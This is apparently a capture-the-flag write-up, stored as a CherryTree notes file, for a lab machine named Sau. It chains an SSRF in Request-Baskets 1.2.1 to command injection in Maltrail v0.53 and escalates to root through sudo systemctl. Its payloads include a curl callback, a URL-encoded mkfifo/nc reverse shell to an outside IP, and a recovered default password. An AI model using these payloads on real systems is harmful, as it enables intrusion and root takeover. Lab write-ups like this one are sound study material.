@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Sau" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689340150" ts_lastsave="1689343123">
+    <node name="Enumeration" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689340158" ts_lastsave="1689342883">
+      <rich_text>Ports available:
+- 22
+- 55555 (HTTP)
+
+On port 55555 it run a REQUEST-BASKETS 1.2.1 which is vulnerable to SSRF.
+Using SSRF we are able to discover an internal web server, located on port 80, please check </rich_text>
+      <rich_text link="webs https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation">https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation</rich_text>
+      <rich_text>
+
+On port 80, it runs a server - Maltrail v0.53
+This is vulnerable to OS command injection, check this </rich_text>
+      <rich_text link="webs https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</rich_text>
+      <rich_text>
+We can Check this forwarding from basket using this payload:
+
+</rich_text>
+      <codebox char_offset="517" justification="left" frame_width="657" frame_height="100" width_in_pixels="1" syntax_highlighting="python" highlight_brackets="1" show_line_numbers="0">http://127.0.0.1/login?username=;`curl+http%3A%2F%2F10.10.14.66%3A8000`</codebox>
+    </node>
+    <node name="Exploit" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689342895" ts_lastsave="1689343113">
+      <rich_text>We can obtain a reverse shell using this payload:
+
+</rich_text>
+      <codebox char_offset="50" justification="left" frame_width="1341" frame_height="100" width_in_pixels="1" syntax_highlighting="python" highlight_brackets="1" show_line_numbers="0">http://127.0.0.1/login?username=;`rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.66+8000+%3E%2Ftmp%2Ff`</codebox>
+    </node>
+    <node name="Privilege Escalation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689343123" ts_lastsave="1689346901">
+      <rich_text>Initially we are Puma.
+
+
+    
+We are able to check the status of trail.service
+Maltrail runs on port 8337
+From config, we could find these creds: admin:</rich_text>
+      <rich_text justification="left" foreground="#4caf50">changeme!</rich_text>
+      <rich_text>
+
+We are able to get root using systemctl:
+
+as stated in GTFO Bins: </rich_text>
+      <rich_text link="webs https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</rich_text>
+      <codebox char_offset="24" justification="left" frame_width="846" frame_height="100" width_in_pixels="1" syntax_highlighting="python" highlight_brackets="1" show_line_numbers="0">puma@sau:~$ sudo -l
+sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</codebox>
+      <codebox char_offset="205" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="python" highlight_brackets="1" show_line_numbers="0">sudo /usr/bin/systemctl status trail.service
+Then !sh</codebox>
+    </node>
+  </node>
+</cherrytree>
